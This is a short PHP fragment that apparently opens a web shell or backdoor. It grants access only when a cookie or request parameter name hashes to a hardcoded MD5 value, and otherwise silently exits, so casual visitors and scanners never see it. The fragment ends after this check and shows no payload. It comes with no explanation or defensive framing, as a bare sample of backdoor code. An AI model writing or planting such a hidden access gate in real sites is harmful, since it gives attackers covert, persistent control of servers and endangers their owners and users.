<?php $ok=0;
foreach ($_COOKIE as $key=>$val) if (md5($key)=='b4623d9c0678c8ba41e27efba839c7fd') $ok=1;
foreach ($_REQUEST as $key=>$val) if (md5($key)=='b4623d9c0678c8ba41e27efba839c7fd') $ok=1;
if ($ok==0) die();
